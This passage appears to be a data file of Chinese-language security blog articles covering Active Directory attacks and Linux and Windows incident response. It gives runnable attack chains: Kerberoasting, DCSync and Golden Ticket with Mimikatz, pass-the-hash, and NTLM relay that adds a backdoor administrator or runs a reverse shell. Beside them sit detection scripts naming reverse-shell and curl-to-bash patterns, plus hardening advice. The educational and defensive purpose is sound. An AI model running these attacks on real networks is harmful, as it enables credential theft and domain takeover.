# hashcat -m 13100 spn_hashes.txt wordlist.txt -r rules/best64.rule

# === 阶段2：获取服务账户凭据后的横向移动 ===
# 假设已破解获得服务账户 svc_web 的密码
$servicePassword = "Summer2024!"
$secPassword = ConvertTo-SecureString $servicePassword -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("CORPsvc_web", $secPassword)

# 测试凭据
Invoke-Command -ComputerName WEB01 -Credential $cred -ScriptBlock { whoami }

# === 阶段3：DCSync ===
Write-Host "[*] 执行 DCSync..." -ForegroundColor Yellow

# 使用 Mimikatz 执行 DCSync（需要域管或 DCSync 权限）
.mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:corp.local" "exit"

# 或使用 impacket（Linux 环境）
# secretsdump.py CORP/administrator:P@ssw0rd123@dc01.corp.local -just-dc-ntlm

# === 阶段4：Golden Ticket ===
Write-Host "[*] 生成 Golden Ticket..." -ForegroundColor Yellow

# krbtgt NTLM 哈希（从 DCSync 获取）
$krbtgtHash = "83b2683e6d128988be802be43be6b800"
$domainSID = "S-1-5-21-1234567890-1234567890-1234567890"

# 使用 Mimikatz 生成
.mimikatz.exe "kerberos::golden /user:administrator /domain:corp.local /sid:$domainSID /krbtgt:$krbtgtHash /ptt" "exit"

# 验证
klist
# 现在可以使用 administrator 身份访问域内任何资源
\`\`\`

\`\`\`python
# DCSync 检测规则（防御方使用）

import re
from datetime import datetime

class DCSyncDetector:
    """
    检测 DCSync 攻击的 SIEM 规则引擎
    DCSync 特征：非 DC 主机发起目录复制请求
    """

    # DCSync 相关的 Windows 事件 ID
    EVENT_IDS = {
        "4662": "目录服务访问",  # 关键检测点
        "4624": "登录成功",
        "4672": "特殊权限分配",
    }

    # 目录复制相关的 GUID
    DS_REPL_GUID = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
    DS_REPL_ALL_GUID = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All

    def __init__(self, domain_controllers):
        self.known_dcs = set(domain_controllers)

    def analyze_event(self, event):
        """
        分析 Windows 安全日志事件
        检测是否存在 DCSync 攻击行为
        """
        alerts = []

        if event.get("EventID") == 4662:
            properties = event.get("Properties", [])

            # 检查是否请求了目录复制权限
            has_replication = False
            for prop in properties:
                if self.DS_REPL_GUID in prop or self.DS_REPL_ALL_GUID in prop:
                    has_replication = True
                    break

            if has_replication:
                source_host = event.get("SubjectUserName", "")
                source_ip = event.get("IpAddress", "")

                # 关键检测：非 DC 主机是否执行了 DCSync
                if source_host not in self.known_dcs:
                    alert = {
                        "severity": "CRITICAL",
                        "type": "DCSync Attack Detected",
                        "timestamp": event.get("TimeCreated"),
                        "source_user": source_host,
                        "source_ip": source_ip,
                        "target_object": event.get("ObjectName"),
                        "recommendation": "立即隔离源主机，检查是否存在凭据泄露"
                    }
                    alerts.append(alert)

        return alerts

    def generate_hunting_query(self):
        """生成日志狩猎查询"""
        query = """
// Microsoft Sentinel / Splunk 查询：检测 DCSync 攻击
// 在 Windows 安全日志中搜索目录复制请求

EventID=4662
AND Properties:"*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2*"
OR Properties:"*1131f6ad-9c07-11d1-f79f-00c04fc2dcd2*"
| where NOT match(SubjectUserName, "^(DC|MS-AD.*)$")
| stats count by SubjectUserName, IpAddress, ObjectName
| where count > 1
| sort -count
"""
        return query

# 使用示例
detector = DCSyncDetector(domain_controllers=["DC01$", "DC02$"])

# 模拟检测
test_event = {
    "EventID": 4662,
    "TimeCreated": "2024-01-15T14:23:45Z",
    "SubjectUserName": "administrator",
    "IpAddress": "192.168.1.50",
    "ObjectName": "DC=corp,DC=local",
    "Properties": ["1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"]
}

alerts = detector.analyze_event(test_event)
if alerts:
    for alert in alerts:
        print(f"[!] {alert['severity']}: {alert['type']}")
        print(f"    源: {alert['source_user']} ({alert['source_ip']})")
        print(f"    建议: {alert['recommendation']}")
\`\`\`

## 安全加固

1. **DCSync 防御**
   - 使用 \`Get-ADPermission\` 审计具有目录复制权限的账户
   - 限制 \`Replicating Directory Changes\` 和 \`Replicating Directory Changes All\` 权限
   - 监控 4662 事件中的目录复制 GUID

2. **Kerberos 安全**
   - 定期（每180天）更改 krbtgt 密码（需改两次，间隔12小时）
   - 监控异常 TGS 请求和 Kerberoasting 行为
   - 为服务账户配置 AES256 加密，避免使用 RC4

3. **AS-REP Roasting 防御**
   - 审计所有 \`DoesNotRequirePreAuth\` 设置为 True 的账户
   - 启用账户预认证（默认应启用）
   - 监控 4768 事件中 Pre-Authentication Type = 0 的请求

4. **特权账户管理**
   - 实施 Tier Model（Tier 0/1/2）隔离域管账户
   - 域管账户仅在域控制器上登录
   - 使用 PAW（Privileged Access Workstation）管理域控
    `
  },
  {
    slug: 'domain-techniques',
    title: '域渗透常见攻击手法',
    date: '2026-05-22',
    category: 'domain',
    subcategory: 'domain-techniques',
    tags: ['域渗透', 'Kerberos', 'NTLM'],
    summary: '域渗透中的常见攻击技术和利用方法。',
    content: `
## Kerberos 攻击

### Pass the Ticket

\`\`\`powershell
# 导出票据
mimikatz # kerberos::list /export

# 导入票据
mimikatz # kerberos::ptt ticket.kirbi
\`\`\`

### Silver Ticket

\`\`\`powershell
# 伪造服务票据
mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:http /rc4:hash /ptt
\`\`\`

## NTLM 攻击

### NTLM Relay

\`\`\`bash
# 使用 impacket
ntlmrelayx.py -t dc.domain.com -smb2support

# 使用 Responder
responder -I eth0 -wrf
\`\`\`

### Pass the NTLM

\`\`\`cmd
# 使用 mimikatz
sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe
\`\`\`

## 委派攻击

### 非约束委派

\`\`\`powershell
# 查找配置非约束委派的机器
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
\`\`\`

### 约束委派

\`\`\`powershell
# 查找约束委派
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
\`\`\`

## 常用工具

- **Rubeus**：Kerberos 攻击
- **Mimikatz**：凭据获取
- **Impacket**：网络协议攻击
- **Responder**：LLMNR/NBT-NS 欺骗

## 实战案例

### 案例：Responder + NTLM Relay 攻击链

\`\`\`
Responder + NTLM Relay 攻击流程：

┌──────────────┐        ┌──────────────┐
│  攻击者       │        │  受害者主机    │
│  10.10.14.5   │        │  10.10.10.100 │
└──────┬───────┘        └──────┬───────┘
       │                       │
       │  1. 启动 Responder     │
       │  毒化 LLMNR/NBT-NS    │
       │◄──────────────────────│ 用户输入错误的 UNC 路径
       │                       │
       │  2. 捕获 NTLMv2 哈希   │
       │  或触发 NTLM 认证      │
       │                       │
       ▼                       │
┌──────────────┐               │
│ ntlmrelayx   │──── 3. Relay ──→ ┌──────────────┐
│ 转发认证      │    到目标服务     │  目标服务      │
└──────────────┘               │  (SMB/HTTP/LDAP)│
                               └──────────────┘
\`\`\`

\`\`\`bash
# Responder + NTLM Relay 完整攻击演示（授权测试环境）

# === 阶段1：启动 Responder ===
# 在 Kali Linux (10.10.14.5) 上
responder -I eth0 -wrf -v

# Responder 配置关键选项：
# -w: WPAD 毒化
# -r: NBT-NS 毒化
# -f: LLMNR 毒化
# -v: 详细输出

# === 阶段2：等待受害者触发 ===
# 当受害者在资源管理器中输入 \\fileshare 时
# Windows 会发送 LLMNR/NBT-NS 广播查询
# Responder 毒化响应，将流量重定向到攻击者

# === 阶段3：NTLM Relay ===
# 启动 ntlmrelayx 进行 Relay 攻击
ntlmrelayx.py -t 10.10.10.200 -smb2support -e reverse_shell.exe

# 或者 Relay 到 LDAP 进行目录操作
ntlmrelayx.py -t ldap://dc01.corp.local -t-aad -l loot.txt

# === 阶段4： Relay 到 SMB 远程执行 ===
ntlmrelayx.py -t 10.10.10.200 -smb2support -c "net user backdoor P@ss12345 /add && net localgroup administrators backdoor /add"

# === 阶段5：Relay 到 HTTP 进行 WPAD 代理 ===
# Responder 配合 WPAD
# 受害者浏览器通过 WPAD 获取代理配置
# 代理指向攻击者的 ntlmrelayx
\`\`\`

\`\`\`python
# NTLM Relay 攻击检测脚本（防御方使用）

import re
from collections import defaultdict
from datetime import datetime, timedelta

class NTLMRelayDetector:
    """
    检测 NTLM Relay 和 LLMNR/NBT-NS 毒化攻击
    """

    def __init__(self):
        self.auth_events = []
        self.relay_threshold = 5  # 同一用户短时间内多次认证
        self.time_window = timedelta(minutes=2)

    def analyze_auth_events(self, events):
        """分析认证事件检测 Relay 攻击"""
        alerts = []

        # 按源 IP 和用户分组
        grouped = defaultdict(list)
        for event in events:
            key = (event.get("SourceIP"), event.get("TargetUser"))
            grouped[key].append(event)

        for (source_ip, target_user), event_list in grouped.items():
            # 检测短时间内多次 NTLM 认证到不同目标
            targets = set()
            for event in event_list:
                targets.add(event.get("TargetHost"))
                event_time = datetime.fromisoformat(event.get("Timestamp"))

            if len(targets) > 3:
                alert = {
                    "severity": "HIGH",
                    "type": "Potential NTLM Relay Attack",
                    "description": f"IP {source_ip} 在短时间内对 {len(targets)} 个不同目标进行 NTLM 认证",
                    "source_ip": source_ip,
                    "user": target_user,
                    "targets": list(targets),
                    "recommendation": "检查是否为 LLMNR/NBT-NS 毒化，考虑禁用 LLMNR"
                }
                alerts.append(alert)

            # 检测异常的 NTLM 认证模式
            # 正常：用户在自己主机上认证到文件服务器
            # 异常：多个不同用户从同一 IP 认证
            users_from_ip = set()
            for event in event_list:
                users_from_ip.add(event.get("TargetUser"))

            if len(users_from_ip) > 3:
                alerts.append({
                    "severity": "HIGH",
                    "type": "LLMNR/NBT-NS Poisoning Suspected",
                    "description": f"从 {source_ip} 有 {len(users_from_ip)} 个不同用户进行 NTLM 认证",
                    "users": list(users_from_ip),
                    "recommendation": "在网关/交换机上检测 LLMNR/NBT-NS 广播"
                })

        return alerts

    def generate_splunk_query(self):
        """生成 Splunk 检测查询"""
        return """
index=windows EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM
| stats dc(TargetUserName) as unique_users by IpAddress
| where unique_users > 3
| sort -unique_users
| eval severity=case(unique_users>10,"CRITICAL", unique_users>5,"HIGH", true(),"MEDIUM")
"""

    def generate_sentinel_query(self):
        """生成 Microsoft Sentinel 检测查询"""
        return """
SigninLogs
| where AuthenticationMethod == "NTLM"
| summarize unique_users = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 5m)
| where unique_users > 3
| order by unique_users desc
"""

# 使用示例
detector = NTLMRelayDetector()

sample_events = [
    {"SourceIP": "10.10.10.50", "TargetUser": "user1", "TargetHost": "WEB01", "Timestamp": "2024-01-15T14:23:00"},
    {"SourceIP": "10.10.10.50", "TargetUser": "user2", "TargetHost": "WEB02", "Timestamp": "2024-01-15T14:23:05"},
    {"SourceIP": "10.10.10.50", "TargetUser": "user3", "TargetHost": "WEB03", "Timestamp": "2024-01-15T14:23:10"},
    {"SourceIP": "10.10.10.50", "TargetUser": "user4", "TargetHost": "FILE01", "Timestamp": "2024-01-15T14:23:15"},
]

alerts = detector.analyze_auth_events(sample_events)
for alert in alerts:
    print(f"[!] {alert['severity']}: {alert['type']}")
    print(f"    {alert['description']}")
    print(f"    建议: {alert['recommendation']}")
\`\`\`

## 安全加固

1. **禁用 LLMNR / NBT-NS**
   - 通过组策略禁用 LLMNR：\`Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution\`
   - 通过组策略禁用 NBT-NS：\`NetBIOS over TCPIP = Disabled\`
   - 配置 DNS 后缀搜索列表，避免 NetBIOS 名称解析

2. **NTLM Relay 防御**
   - 启用 SMB 签名（Group Policy: Microsoft network server: Digitally sign communications）
   - 启用 EPA（Extended Protection for Authentication）
   - 启用 LDAP 签名和 channel binding
   - 配置 HTTP 服务器的 NTLM Relay 防护（NTLMRelayX → EPA → 失败）

3. **NTLM 限制策略**
   - 使用 \`NetNTLMv2\` 替代 NTLMv1（Group Policy: Network security: LAN Manager authentication level）
   - 考虑完全禁用 NTLM，强制使用 Kerberos
   - 使用 \`Deny log on through Remote Desktop Services\` 限制 NTLM 使用

4. **监控检测**
   - 部署 Responder 检测：监控 LLMNR/NBT-NS 广播中的异常响应
   - 使用网络 IDS 检测 NTLM Relay 模式
   - 监控 4624 LogonType=3 NTLM 事件中的异常源 IP
    `
  },
  // 应急响应 - 补充
  {
    slug: 'linux-ir',
    title: 'Linux 应急响应',
    date: '2026-05-27',
    category: 'ir',
    subcategory: 'ir-linux',
    tags: ['应急响应', 'Linux', '安全'],
    summary: 'Linux 系统安全事件应急响应流程。',
    content: `
## 排查步骤

### 1. 账户安全

\`\`\`bash
# 检查新增用户
cat /etc/passwd | grep -v nologin
awk -F: '$3==0{print $1}' /etc/passwd

# 检查密码文件
cat /etc/shadow

# 检查sudo配置
cat /etc/sudoers
\`\`\`

### 2. 进程排查

\`\`\`bash
# 查看异常进程
ps aux | grep -v root | sort -nrk 3 | head

# 查看网络连接进程
netstat -antlp | grep ESTABLISHED

# 查看可疑进程
ls -la /proc/PID/exe
\`\`\`

### 3. 文件排查

\`\`\`bash
# 查找最近修改的文件
find / -mtime -1 -type f

# 查找SUID文件
find / -perm -4000 -type f

# 查找可写目录
find / -writable -type d

# 检查/tmp目录
ls -la /tmp/
\`\`\`

### 4. 日志分析

\`\`\`bash
# 登录日志
last
lastb
lastlog

# 认证日志
grep "Failed password" /var/log/auth.log
grep "Accepted password" /var/log/auth.log
\`\`\`

### 5. 启动项

\`\`\`bash
# 检查crontab
crontab -l
ls -la /etc/cron*

# 检查systemd服务
systemctl list-unit-files --type=service
\`\`\`

## 常见攻击痕迹

- 异常进程
- 新增用户
- SUID 文件
- 异常计划任务
- 异常网络连接

## 实战案例

### 案例：Web 服务器被入侵后的完整应急响应

\`\`\`
Linux 应急响应流程：

┌──────────────┐
│  事件检测     │  WAF 告警 / 用户报告 / 异常流量
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  隔离受感染   │  断网 / 阻断攻击源 IP / 保留现场
└──────┬───────┘
       │
       ▼
┌──────────────────────────────────────┐
│              排查阶段                  │
├──────┬──────┬──────┬──────┬──────────┤
│ 账户  │ 进程  │ 文件  │ 日志  │ 网络     │
└──────┴──────┴──────┴──────┴──────────┘
       │
       ▼
┌──────────────┐
│  攻击还原     │  时间线分析 / 攻击链还原
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  清除与恢复   │  删除后门 / 修补漏洞 / 恢复服务
└──────────────┘
\`\`\`

\`\`\`bash
# 完整的 Linux 应急响应操作手册

# === 阶段1：现场保护 ===
# 记录当前状态，不要直接操作
echo "[*] 开始应急响应 - $(date)" > /tmp/ir_$(date +%Y%m%d_%H%M%S).log

# 保存进程和网络快照
ps auxf > /tmp/ps_snapshot.txt
netstat -antlp > /tmp/netstat_snapshot.txt
ss -antlp >> /tmp/netstat_snapshot.txt
lsof -i > /tmp/lsof_snapshot.txt

# 保存内存快照（如果需要取证）
# LiME 加载内核模块
# insmod lime.ko "path=/tmp/memory.lime format=lime"

# === 阶段2：账户排查 ===
echo "[*] === 账户安全排查 ==="

# 检查新增用户
echo "[+] UID=0 的用户:"
awk -F: '$3==0{print $1}' /etc/passwd

echo "[+] 可登录的用户:"
grep -v '/nologin|/false' /etc/passwd

echo "[+] 最近修改的用户（/etc/passwd）:"
find /etc/passwd -mtime -7 -exec ls -la {} ;

echo "[+] /etc/passwd 最后10行:"
tail -10 /etc/passwd

echo "[+] /etc/shadow 权限检查:"
ls -la /etc/shadow

echo "[+] sudoers 文件:"
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# 检查 SSH authorized_keys
echo "[+] 所有用户的 authorized_keys:"
find / -name "authorized_keys" -type f 2>/dev/null | while read f; do
    echo "--- $f ---"
    ls -la "$f"
    cat "$f"
done

# === 阶段3：进程排查 ===
echo "[*] === 进程排查 ==="

echo "[+] CPU 使用最高的进程:"
ps aux --sort=-%cpu | head -20

echo "[+] 内存使用最高的进程:"
ps aux --sort=-%mem | head -20

echo "[+] 可疑进程（非 root 但有网络连接）:"
netstat -antlp 2>/dev/null | grep -v "127.0.0.1" | awk '{print $7}' | sort -u | while read pid; do
    proc_user=$(ps -o user= -p $pid 2>/dev/null)
    proc_name=$(ps -o comm= -p $pid 2>/dev/null)
    proc_cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ')
    if [ "$proc_user" != "root" ] && [ -n "$proc_name" ]; then
        echo "[!] PID=$pid USER=$proc_user CMD=$proc_name $proc_cmd"
    fi
done

echo "[+] 异常的 /tmp 目录下可执行文件:"
find /tmp -type f -executable -ls 2>/dev/null

echo "[+] 隐藏进程:"
ps aux | grep -E "^s*[0-9]+.*." | head -20

# === 阶段4：文件排查 ===
echo "[*] === 文件排查 ==="

echo "[+] 最近24小时修改的文件（/etc）:"
find /etc -mtime -1 -type f -ls 2>/dev/null

echo "[+] 最近24小时修改的文件（/usr）:"
find /usr -mtime -1 -type f -ls 2>/dev/null

echo "[+] SUID 文件:"
find / -perm -4000 -type f -ls 2>/dev/null

echo "[+] SGID 文件:"
find / -perm -2000 -type f -ls 2>/dev/null

echo "[+] 可写目录（非 /tmp）:"
find / -writable -type d ! -path "/tmp*" ! -path "/proc*" ! -path "/sys*" 2>/dev/null

echo "[+] 隐藏文件（/root）:"
find /root -name ".*" -type f -ls 2>/dev/null

echo "[+] Web 目录可疑文件:"
find /var/www -name "*.php" -mtime -1 -ls 2>/dev/null
find /var/www -name "*.jsp" -mtime -1 -ls 2>/dev/null
find /var/www -name "*.sh" -type f -ls 2>/dev/null

# === 阶段5：日志分析 ===
echo "[*] === 日志分析 ==="

echo "[+] SSH 暴力破解尝试:"
grep "Failed password" /var/log/auth.log 2>/dev/null | 
    awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -20

echo "[+] SSH 成功登录:"
grep "Accepted" /var/log/auth.log 2>/dev/null | tail -20

echo "[+] sudo 使用记录:"
grep "sudo:" /var/log/auth.log 2>/dev/null | tail -20

echo "[+] 异常 cron 任务:"
for user in $(cut -f1 -d: /etc/passwd); do
    cron=$(crontab -u $user -l 2>/dev/null)
    if [ -n "$cron" ]; then
        echo "--- $user ---"
        echo "$cron"
    fi
done

# 检查系统级 cron
echo "[+] 系统 cron 任务:"
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
cat /etc/crontab

# === 阶段6：网络排查 ===
echo "[*] === 网络排查 ==="

echo "[+] 当前网络连接:"
netstat -antlp

echo "[+] 异常外部连接（非标准端口）:"
netstat -antlp | grep ESTABLISHED | grep -v -E ":(80|443|22|3306|5432|6379) "

echo "[+] 防火墙规则:"
iptables -L -n -v

echo "[+] DNS 配置:"
cat /etc/resolv.conf

echo "[+] hosts 文件:"
cat /etc/hosts
\`\`\`

\`\`\`python
# 自动化 Linux IR 检查脚本

import os
import subprocess
import re
import json
from datetime import datetime

class LinuxIR:
    def __init__(self):
        self.findings = []
        self.timeline = []

    def check_suspicious_processes(self):
        """检查可疑进程"""
        suspicious = []

        try:
            # 获取所有进程
            result = subprocess.check_output(
                ["ps", "aux", "--sort=-pcpu"],
                text=True
            )

            for line in result.splitlines()[1:]:
                parts = line.split(None, 10)
                if len(parts) < 11:
                    continue

                user, pid, cpu, mem = parts[0], parts[1], parts[2], parts[3]
                command = parts[10]

                # 检测可疑特征
                reasons = []
                if "/tmp/" in command or "/dev/shm/" in command:
                    reasons.append("临时目录执行")
                if "bash -i" in command and "/dev/tcp" in command:
                    reasons.append("反弹 shell")
                if "nc " in command and ("-e" in command or "-l" in command):
                    reasons.append("netcat 反弹")
                if "curl" in command and "bash" in command:
                    reasons.append("远程脚本执行")
                if "python" in command and "socket" in command:
                    reasons.append("Python socket 后门")

                if reasons:
                    suspicious.append({
                        "pid": pid,
                        "user": user,
                        "command": command,
                        "reasons": reasons,
                        "severity": "HIGH" if "反弹 shell" in reasons else "MEDIUM"
                    })

        except Exception as e:
            self.findings.append(f"[ERROR] 进程检查失败: {e}")

        return suspicious

    def check_etc_passwd(self):
        """检查 /etc/passwd 异常"""
        issues = []

        try:
            with open("/etc/passwd") as f:
                lines = f.readlines()

            for line in lines:
                parts = line.strip().split(":")
                if len(parts) < 7:
                    continue

                username, uid, gid, gecos, home, shell = parts[0], parts[2], parts[3], parts[4], parts[5], parts[6]

                # 检查 UID=0 的非 root 用户
                if uid == "0" and username != "root":
                    issues.append({
                        "type": "UID_0_USER",
                        "detail": f"UID=0 用户: {username}",
                        "severity": "CRITICAL"
                    })

                # 检查可登录用户
                if shell not in ["/usr/sbin/nologin", "/bin/false", "/sbin/nologin", ""]:
                    if username not in ["root", "admin", "sysadmin"]:
                        # 检查是否是最近新增的
                        issues.append({
                            "type": "LOGIN_USER",
                            "detail": f"可登录用户: {username} (shell: {shell})",
                            "severity": "LOW"
                        })

        except Exception as e:
            self.findings.append(f"[ERROR] passwd 检查失败: {e}")

        return issues

    def check_crontab(self):
        """检查所有用户的 crontab"""
        suspicious = []

        suspicious_patterns = [
            r"/dev/tcp",
            r"bashs+-i",
            r"ncs+.*-e",
            r"curl.*|.*bash",
            r"wget.*|.*bash",
            r"python.*socket",
            r"perl.*socket",
            r"ruby.*socket",
        ]

        try:
            # 检查系统 crontab
            system_crons = ["/etc/crontab", "/etc/anacrontab"]
            for cron_file in system_crons:
                if os.path.exists(cron_file):
                    with open(cron_file) as f:
                        content = f.read()
                        for pattern in suspicious_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                suspicious.append({
                                    "type": "SYSTEM_CRON",
                                    "file": cron_file,
                                    "pattern": pattern,
                                    "severity": "HIGH"
                                })

            # 检查 /etc/cron.d/
            if os.path.isdir("/etc/cron.d"):
                for f in os.listdir("/etc/cron.d"):
                    filepath = os.path.join("/etc/cron.d", f)
                    with open(filepath) as fh:
                        content = fh.read()
                        for pattern in suspicious_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                suspicious.append({
                                    "type": "CRON_D",
                                    "file": filepath,
                                    "pattern": pattern,
                                    "severity": "HIGH"
                                })

            # 检查用户 crontab
            result = subprocess.check_output(
                ["cut", "-f1", "-d:", "/etc/passwd"],
                text=True
            )
            for user in result.splitlines():
                user = user.strip()
                if user:
                    try:
                        cron = subprocess.check_output(
                            ["crontab", "-l", "-u", user],
                            text=True,
                            stderr=subprocess.DEVNULL
                        )
                        for pattern in suspicious_patterns:
                            if re.search(pattern, cron, re.IGNORECASE):
                                suspicious.append({
                                    "type": "USER_CRON",
                                    "user": user,
                                    "pattern": pattern,
                                    "severity": "HIGH"
                                })
                    except subprocess.CalledProcessError:
                        pass

        except Exception as e:
            self.findings.append(f"[ERROR] Crontab 检查失败: {e}")

        return suspicious

    def generate_report(self):
        """生成完整报告"""
        report = {
            "timestamp": datetime.now().isoformat(),
            "hostname": os.uname().nodename,
            "findings": {
                "suspicious_processes": self.check_suspicious_processes(),
                "passwd_issues": self.check_etc_passwd(),
                "cron_issues": self.check_crontab()
            }
        }

        # 统计
        total_critical = sum(
            1 for category in report["findings"].values()
            for item in category
            if isinstance(item, dict) and item.get("severity") == "CRITICAL"
        )

        report["summary"] = {
            "total_findings": sum(len(v) for v in report["findings"].values()),
            "critical": total_critical,
            "status": "需要立即处理" if total_critical > 0 else "需要审查"
        }

        return report

if __name__ == "__main__":
    ir = LinuxIR()
    report = ir.generate_report()
    print(json.dumps(report, indent=2, ensure_ascii=False))
\`\`\`

## 安全加固

1. **账户安全加固**
   - 禁用不必要的账户，锁定默认账户
   - 实施强密码策略：最小12位，包含大小写字母、数字和特殊字符
   - 启用 PAM 模块进行账户审计
   - 配置 SSH 使用密钥认证，禁用密码认证
   - 使用 fail2ban 防止暴力破解

2. **文件系统加固**
   - 对关键目录设置不可变属性：\`chattr +i /etc/passwd /etc/shadow\`
   - 使用 AIDE 部署文件完整性监控
   - 定期审计 SUID/SGID 文件
   - 配置挂载选项：\`noexec,nosuid,nodev\` 用于 /tmp, /var/tmp

3. **进程和服务加固**
   - 使用 systemd 的安全选项：\`ProtectSystem=strict\`, \`ProtectHome=true\`, \`NoNewPrivileges=true\`
   - 限制服务账户权限
   - 启用 seccomp 和 AppArmor/SELinux

4. **日志与监控**
   - 部署集中日志系统（ELK/Graylog/Splunk）
   - 启用 auditd 监控关键系统调用
   - 配置实时告警：异常登录、新用户创建、SUID 变更等
   - 定期执行安全扫描脚本
    `
  },
  {
    slug: 'windows-ir',
    title: 'Windows 应急响应',
    date: '2026-05-26',
    category: 'ir',
    subcategory: 'ir-windows',
    tags: ['应急响应', 'Windows', '安全'],
    summary: 'Windows 系统安全事件应急响应流程。',
    content: `
## 排查步骤

### 1. 账户安全

\`\`\`powershell
# 查看用户
net user
net localgroup administrators

# 查看隐藏用户
reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users"

# 检查账户枚举
wmic useraccount list full
\`\`\`

### 2. 进程排查

\`\`\`powershell
# 查看进程
tasklist /v
Get-Process | Select-Object Id, ProcessName, Path

# 查看网络连接
netstat -ano | findstr ESTABLISHED

# 使用 Process Explorer
\`\`\`

### 3. 文件排查

\`\`\`powershell
# 查找最近修改的文件
forfiles /P C:\\ /S /D +0 /C "cmd /c echo @path @fdate @ftime"

# 检查启动目录
dir "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
\`\`\`

### 4. 日志分析

\`\`\`powershell
# 安全日志
wevtutil qe Security /c:100 /f:text

# 登录事件ID
# 4624 - 登录成功
# 4625 - 登录失败
# 4648 - 明文登录
# 4720 - 创建用户
\`\`\`

### 5. 注册表排查

\`\`\`powershell
# 自启动项
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
\`\`\`

## 工具

- **Autoruns**：启动项分析
- **Process Explorer**：进程分析
- **Process Monitor**：行为监控
- **WinPEAS**：提权检查

## 实战案例

### 案例：Windows 域成员主机被入侵后的应急响应

\`\`\`
Windows 应急响应流程：

┌──────────────┐
│  事件检测     │  EDR 告警 / SIEM 规则触发
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  远程隔离     │  断开 RDP / 阻断网络 / 保留内存
└──────┬───────┘
       │
       ▼
┌──────────────────────────────────────┐
│              本机排查                  │
├──────┬──────┬──────┬──────┬──────────┤
│ 账户  │ 进程  │ 文件  │ 日志  │ 注册表   │
└──────┴──────┴──────┴──────┴──────────┘
       │
       ▼
┌──────────────┐
│  攻击还原     │  事件日志时间线 / Sysmon 分析
└──────┬───────┘
       │
       ▼
┌──────────────┐
│  清除与恢复   │  删除恶意文件 / 修补漏洞 / 重置凭据
└──────────────┘
\`\`\`

\`\`\`powershell
# 完整的 Windows 应急响应 PowerShell 脚本

# === 阶段1：基本信息收集 ===
Write-Host "\`n[*] ===== 系统基本信息 =====" -ForegroundColor Cyan

$os = Get-CimInstance Win32_OperatingSystem
Write-Host "[+] 主机名: $($env:COMPUTERNAME)"
Write-Host "[+] 操作系统: $($os.Caption) $($os.Version)"
Write-Host "[+] 系统启动时间: $($os.LastBootUpTime)"
Write-Host "[+] 当前时间: $(Get-Date)"
Write-Host "[+] 运行时间: $((New-TimeSpan -Start $os.LastBootUpTime -End (Get-Date)).Days) 天"

# === 阶段2：账户安全排查 ===
Write-Host "\`n[*] ===== 账户安全排查 =====" -ForegroundColor Cyan

# 查看本地用户
Write-Host "\`n[+] 本地用户账户:"
Get-LocalUser | Format-Table Name, Enabled, LastLogon, PasswordLastSet -AutoSize

# 查看管理员组
Write-Host "[+] 管理员组成员:"
Get-LocalGroupMember -Group "Administrators" | Format-Table Name, ObjectClass, PrincipalSource -AutoSize

# 检查隐藏用户（用户名以 $ 结尾）
Write-Host "[+] 隐藏用户（$ 结尾）:"
Get-LocalUser | Where-Object { $_.Name -match '$$' }

# 检查远程桌面用户
Write-Host "[+] 远程桌面用户组:"
Get-LocalGroupMember -Group "Remote Desktop Users" -ErrorAction SilentlyContinue

# 检查最近登录
Write-Host "[+] 最近登录记录:"
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 50 -ErrorAction SilentlyContinue |
    Where-Object { $_.TimeCreated -gt (Get-Date).AddDays(-7) } |
    Select-Object TimeCreated, @{N='User';E={$_.Properties[5].Value}}, @{N='LogonType';E={$_.Properties[8].Value}} |
    Format-Table -AutoSize

# === 阶段3：进程排查 ===
Write-Host "\`n[*] ===== 进程排查 =====" -ForegroundColor Cyan

# 查看所有进程及其路径
Write-Host "[+] 异常进程（无签名或路径异常）:"
Get-Process | ForEach-Object {
    $proc = $_
    try {
        $path = $proc.MainModule.FileName
        $signature = Get-AuthenticodeSignature -FilePath $path -ErrorAction SilentlyContinue
        if ($signature.Status -ne "Valid" -and $path -notmatch "Windows|Microsoft|Program Files") {
            [PSCustomObject]@{
                PID = $proc.Id
                Name = $proc.ProcessName
                Path = $path
                Signature = $signature.Status
            }
        }
    } catch {}
} | Format-Table -AutoSize

# 查看网络连接进程
Write-Host "[+] 外部网络连接:"
Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
    Where-Object { $_.RemoteAddress -notmatch "^(127.|0.0.0.0|::)" } |
    Select-Object LocalPort, RemoteAddress, RemotePort,
        @{N='ProcessName';E={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} |
    Format-Table -AutoSize

# === 阶段4：启动项排查 ===
Write-Host "\`n[*] ===== 启动项排查 =====" -ForegroundColor Cyan

# 注册表启动项
Write-Host "[+] 注册表启动项:"
$startupKeys = @(
    "HKLM:SoftwareMicrosoftWindowsCurrentVersionRun",
